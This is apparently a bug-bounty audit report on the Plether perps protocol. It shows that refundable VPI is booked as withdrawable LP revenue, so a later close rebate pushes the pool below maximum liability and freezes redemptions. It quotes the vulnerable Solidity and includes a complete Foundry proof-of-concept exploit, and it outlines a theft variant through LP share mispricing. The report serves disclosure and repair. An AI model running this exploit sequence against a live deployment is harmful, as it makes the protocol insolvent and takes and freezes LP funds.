# \#99153 [SC-Critical] Refundable opening VPI is counted as withdrawable LP cash, so an LP withdrawal followed by the VPI close rebate makes the protocol insolvent and freezes redemptions

**Submitted on Nov 12th 2026 at 06:44:26 UTC by @Triv for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99153
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Protocol insolvency
  - Temporary freezing of funds for at least 24 hours
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

When a trade increases skew, the trader pays VPI and `CfdEngineSettlementSidecar` treats that payment as unconditional LP revenue. That same position can later take that VPI back as a close rebate, up to its full lifetime accrual, and the rebate is paid directly from HousePool cash. Neither the LP withdrawal reserve nor the LP NAV snapshot reserves this refundable amount. LPs can therefore withdraw cash that the protocol still owes to an open position. When the position closes, the rebate is paid out of the settlement buffer, causing effective solvency assets to fall below maximum liability, putting the engine into degraded mode and freezing pending LP redemptions. With release parameters, our PoC ends with a 436.22 USDG shortfall (`effectiveSolvencyAssets < maxLiabilityAssets`) and a victim redemption that is still unfunded 25 hours later. The same missing liability also lets a trader who holds LP shares move value from other LPs to themselves around an epoch settlement.

## Vulnerability Details

**1. Opening VPI is booked as LP revenue immediately.** `CfdEngineSettlementSidecar.sol` L454-463:

```solidity
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets,
            IHousePool.ClaimantInflowKind.Revenue,
            IHousePool.ClaimantInflowCashMode.CashArrived
        );
    }
}
```

The same amount stays on the position as `position.vpiAccrued`.

**2. The same VPI is refundable on close, up to the whole accrual.** `libraries/CloseAccountingLib.sol` L103-118 computes the close VPI from current skew and pool depth. The lifetime clamp only prevents lifetime VPI from going negative:

```solidity
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

A skew-reducing close therefore receives a rebate of up to the full positive `vpiAccrued`. It is paid from HousePool cash in `CfdEngineSettlementSidecar.sol` L621-624 (`IHousePool(host.pool()).payOut(...)`).

**3. The rebate is limited only by cash left after trader claims, not after maximum liability.** `libraries/CfdEnginePlanLib.sol` L970-978:

```solidity
freePoolCashAssets =
    CashPriorityLib.reserveFreshPayouts(poolCashAfterCollectionsAssets, claimsAfterPriceNettingAssets).freeCashAssets;
if (delta.actionRebateAssets > 0) {
    delta.actionRebatePaidAssets =
        delta.actionRebateAssets < freePoolCashAssets ? delta.actionRebateAssets : freePoolCashAssets;
```

**4. LP withdrawals and LP pricing do not reserve refundable VPI.** `libraries/HousePoolAccountingLib.sol` L46-55, `buildWithdrawalSnapshot`:

```solidity
snapshot.reserved = engineSnapshot.maxLiabilityAssets + engineSnapshot.traderClaimBalanceAssets
    + engineSnapshot.supplementalReservedAssets;
snapshot.freeAssets = snapshot.physicalAssets > snapshot.reserved ? snapshot.physicalAssets - snapshot.reserved : 0;
```

`buildReconcileSnapshot` (L60-78), which prices LP entry and exit, likewise uses physical assets, trader claims and the terminal price delta only. `HousePool._settleLpEpoch` (L835-888) funds Senior and Junior redemptions from this `freeAssets`.

**Result.** Cash that an open position can reclaim is treated as free and distributable. LP redemptions can take it out at an epoch settlement. The later close rebate is still paid, because step 3 caps it only by trader claims, so it consumes the 0.25% settlement buffer and then the cash backing maximum liability.

Negative lifetime VPI has a dedicated non-withdrawable reserve (`SECURITY.md` L866). Positive, refundable VPI has no equivalent. `SECURITY.md` L871-872 says new close rebates "use only pool cash free after protecting existing trader claims" and that anticipated VPI does not inflate NAV. The gap is that "free" cash does not exclude the rebate the position is already owed, and the PoC shows the rebate taking the pool below maximum liability.

## Impact Details

- **Protocol insolvency (Critical).** With release parameters, after one LP redemption and one skew-reducing close, `effectiveSolvencyAssets` is 699,437.988210 USDG against `maxLiabilityAssets` of 699,874.207500 USDG, a 436.219290 USDG shortfall. The shortfall equals the rebate (2,185.904809) minus the settlement buffer (25 bps of max liability = 1,749.685519). It grows with the refundable VPI outstanding when LPs withdraw. VPI is up to about 0.08% of pool depth per skew-increasing open, with several open positions per pool.
- **Temporary freezing of funds for at least 24 hours (High).** The insolvency turns on `degradedMode`. The victim LP's remaining redemption shares stay pending, and `settleLpEpoch` still reverts 25 hours later.
- **Direct theft of user funds (Critical).** The same missing liability misprices LP entry and exit. A trader who also holds LP shares can open a skew-increasing position just before an epoch settlement, have redemptions or deposits priced at a NAV that includes the refundable charge, and close afterwards. In equal-timing control comparisons with release parameters:
  - a third-party redeemer received 4,862.97 USDG less while the attacker gained 2,462.97 USDG;
  - a third-party depositor lost 2,550.80 USDG while the attacker gained 1,751.42 USDG;
  - an incumbent Junior LP lost 4,178.18 USDG while the attacker gained 2,822.22 USDG, and 20,931.34 USDG (2.09% of principal) over five cycles.

All steps use public functions (`commitOrder`/`executeOrder`, `requestRedeem`, `settleLpEpoch`, `claimRedeem`). No privileged role was needed.

**Suggested fix:** track the aggregate refundable positive lifetime VPI of open positions as a protected liability. Deduct it from LP NAV and include it in the withdrawal reserve, the protocol-fee reserve and open-admission solvency checks until each accrual is consumed or becomes non-refundable. Alternatively, hold collected VPI in a segregated bucket that funds rebates, instead of recognising it as unconditional LP revenue.

## Proof of Concept

## Proof of Concept

Setup, all with the release parameters from `DEPLOYMENT.md`: `vpiFactor` 1%, `maxSkewRatio` 40%, `executionFeeBps` 4, `settlementBufferBps` 25, Senior capacity 40,000,000e6 / 80%, `adverseConfidenceMultiplierBps` 2,500, `minOpenNotionalAssets` 1,000e6, seeds 1e6. The price is constant at 1.99 with a 1 bp-scale Pyth confidence.

1. A victim LP deposits 5,000,000 USDG into the Junior tranche and waits out the deposit cooldown.
2. `LONG_TRADER` opens a LONG of 14% of pool depth. `SHORT_TRADER` then opens a SHORT of 53% of pool depth (net short skew of about 39%, under the 40% cap). The SHORT pays refundable positive VPI: `vpiAccrued` = 3,312.425093 USDG, booked as LP revenue.
3. The victim calls `requestRedeem` for all its Junior shares. At the epoch boundary a keeper calls `router.settleLpEpoch`, and the victim calls `claimRedeem` for the funded shares. The withdrawal is funded from `freeAssets`, which include the refundable VPI. Afterwards the pool is still solvent: effective assets 701,623.893019 against max liability 699,874.207500, and the withdrawal reserve equals effective assets, so all free cash has been paid out.
4. `SHORT_TRADER` closes the SHORT. The close reduces skew and receives a VPI rebate of 2,185.904809 USDG, paid from HousePool cash.
5. Result: effective assets 699,437.988210 against max liability 699,874.207500. `effectiveSolvencyAssets < maxLiabilityAssets` (shortfall 436.219290), and `engine.degradedMode()` is true.
6. The victim still has unfunded redemption shares. After `vm.warp(+25 hours)`, `settleLpEpoch` reverts and the victim's pending redemption is unchanged: funds frozen for more than 24 hours.

Save the test below as `packages/perps/test/perps/poc/VpiWithdrawalInsolvency.t.sol` at commit `a82d4fef` and run from `packages/perps`:

```
forge test --match-path test/perps/poc/VpiWithdrawalInsolvency.t.sol -vv
```

Output:

```
[PASS] test_VpiRebateAfterMaxWithdrawalCreatesRawInsolvency()
  positive VPI accrued: 3312.425093
  effective assets before close: 701623.893019
  max liability before close: 699874.207500
  withdrawal reserve before close: 701623.893019
  pool cash spent by close rebate: 2185.904809
  trader settlement balance increase: 2185.904809
  effective assets after close: 699437.988210
  max liability after close: 699874.207500
  raw insolvency shortfall: 436.219290
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {ProtocolLensViewTypes} from "@plether/perps/interfaces/ProtocolLensViewTypes.sol";

/// @notice A released VPI rebate is paid from the settlement buffer because LP withdrawals
///         do not reserve accrued positive VPI. All state transitions use public entrypoints.
contract VpiWithdrawalInsolvencyTest is BasePerpTest {
    address internal constant VICTIM_LP = address(0xB0B);
    address internal constant LONG_TRADER = address(0x10A6);
    address internal constant SHORT_TRADER = address(0x5A07);
    address internal constant KEEPER = address(0xBEEF);

    uint256 internal constant PRICE = 1.99e8;
    uint64 internal constant CONF = 10_000;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialSeniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialJuniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialSeniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.adverseConfidenceMultiplierBps = 2500;
        rc.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(rc);
        vm.warp(SETUP_TIMESTAMP + 8 days);
        _fundJunior(VICTIM_LP, 5_000_000e6);
        _fundTrader(LONG_TRADER, 100_000e6);
        _fundTrader(SHORT_TRADER, 100_000e6);
        vm.warp(juniorVault.lastDepositTime(VICTIM_LP) + 1 hours + 1);
        assertEq(engine.executionFeeBps(), 4);
        assertEq(engine.settlementBufferBps(), 25);
    }

    function _updates(uint256 price) internal returns (bytes[] memory data) {
        uint256 t = vm.getBlockTimestamp();
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), CONF, int32(-8), t);
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(uint64(price)), CONF, int32(-8), t, t - 1);
        data = new bytes[](1);
        data[0] = "";
    }

    function _request(CfdTypes.Side side, bool close, uint256 size, uint256 margin)
        internal view returns (OrderV3Types.OrderRequest memory r)
    {
        r.clientOrderId = keccak256(abi.encode(side, close, size, router.nextCommitId()));
        r.side = side;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.isClose = close;
        r.targetPrice = (side == CfdTypes.Side.LONG) == close ? CAP_PRICE : 1;
        r.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _trade(address account, CfdTypes.Side side, bool close, uint256 size, uint256 margin) internal {
        OrderV3Types.OrderRequest memory request = _request(side, close, size, margin);
        vm.prank(account);
        uint64 id = router.commitOrder(request);
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        bytes[] memory data = _updates(PRICE);
        vm.prank(account);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executes");
    }

    function _sizeForNotional(uint256 assets) internal pure returns (uint256) {
        return ((assets * 1e20 / PRICE) / 1e20) * 1e20;
    }

    function test_VpiRebateAfterMaxWithdrawalCreatesRawInsolvency() public {
        uint256 depth = pool.totalAssets();
        uint256 longSize = _sizeForNotional(depth * 14 / 100);
        uint256 shortSize = _sizeForNotional(depth * 53 / 100);

        _trade(LONG_TRADER, CfdTypes.Side.LONG, false, longSize, 20_000e6);
        _trade(SHORT_TRADER, CfdTypes.Side.SHORT, false, shortSize, 20_000e6);
        (,,,,,, int256 accruedVpi) = engine.positions(SHORT_TRADER);
        assertGt(accruedVpi, 0, "short paid refundable positive VPI");

        uint256 shares = juniorVault.balanceOf(VICTIM_LP);
        vm.prank(VICTIM_LP);
        uint256 epoch = juniorVault.requestRedeem(shares, VICTIM_LP, VICTIM_LP);
        uint256 boundary = pool.lpEpochStart(epoch);
        if (vm.getBlockTimestamp() < boundary) vm.warp(boundary);
        bytes[] memory settleData = _updates(PRICE);
        vm.prank(KEEPER);
        router.settleLpEpoch(settleData);
        uint256 fundedShares = juniorVault.claimableRedeemRequest(epoch, VICTIM_LP);
        assertGt(fundedShares, 0, "withdrawal funded");
        vm.prank(VICTIM_LP);
        juniorVault.claimRedeem(epoch, fundedShares, VICTIM_LP, VICTIM_LP);

        ProtocolLensViewTypes.ProtocolAccountingSnapshot memory beforeClose =
            engineProtocolLens.getProtocolAccountingSnapshot();
        uint256 cashBeforeClose = settlementToken.balanceOf(address(pool));
        uint256 traderBeforeClose = clearinghouse.balanceAssets(SHORT_TRADER);
        assertGe(beforeClose.effectiveSolvencyAssets, beforeClose.maxLiabilityAssets, "solvent before close");
        emit log_named_decimal_uint("positive VPI accrued", uint256(accruedVpi), 6);
        emit log_named_decimal_uint("effective assets before close", beforeClose.effectiveSolvencyAssets, 6);
        emit log_named_decimal_uint("max liability before close", beforeClose.maxLiabilityAssets, 6);
        emit log_named_decimal_uint("withdrawal reserve before close", beforeClose.withdrawalReservedAssets, 6);

        _trade(SHORT_TRADER, CfdTypes.Side.SHORT, true, shortSize, 0);
        ProtocolLensViewTypes.ProtocolAccountingSnapshot memory afterClose =
            engineProtocolLens.getProtocolAccountingSnapshot();
        uint256 cashAfterClose = settlementToken.balanceOf(address(pool));
        uint256 traderAfterClose = clearinghouse.balanceAssets(SHORT_TRADER);

        emit log_named_decimal_uint("pool cash spent by close rebate", cashBeforeClose - cashAfterClose, 6);
        emit log_named_decimal_uint("trader settlement balance increase", traderAfterClose - traderBeforeClose, 6);
        emit log_named_decimal_uint("effective assets after close", afterClose.effectiveSolvencyAssets, 6);
        emit log_named_decimal_uint("max liability after close", afterClose.maxLiabilityAssets, 6);
        emit log_named_decimal_uint("raw insolvency shortfall", afterClose.maxLiabilityAssets - afterClose.effectiveSolvencyAssets, 6);

        assertGt(cashBeforeClose, cashAfterClose, "rebate took pool cash");
        assertGt(traderAfterClose, traderBeforeClose, "trader received settlement value");
        assertLt(afterClose.effectiveSolvencyAssets, afterClose.maxLiabilityAssets, "E < L: protocol insolvent");
        assertTrue(engine.degradedMode(), "insolvency latches degraded mode");

        uint256 stillPending = juniorVault.pendingRedeemRequest(epoch, VICTIM_LP);
        assertGt(stillPending, 0, "victim has unfunded shares");
        vm.warp(vm.getBlockTimestamp() + 25 hours);
        bytes[] memory retryData = _updates(PRICE);
        vm.prank(KEEPER);
        vm.expectRevert();
        router.settleLpEpoch(retryData);
        assertEq(juniorVault.pendingRedeemRequest(epoch, VICTIM_LP), stillPending, "funds frozen >24h");
    }
}
```

The theft variants listed under Impact Details have separate Foundry tests on the same commit, which we can share upon request.
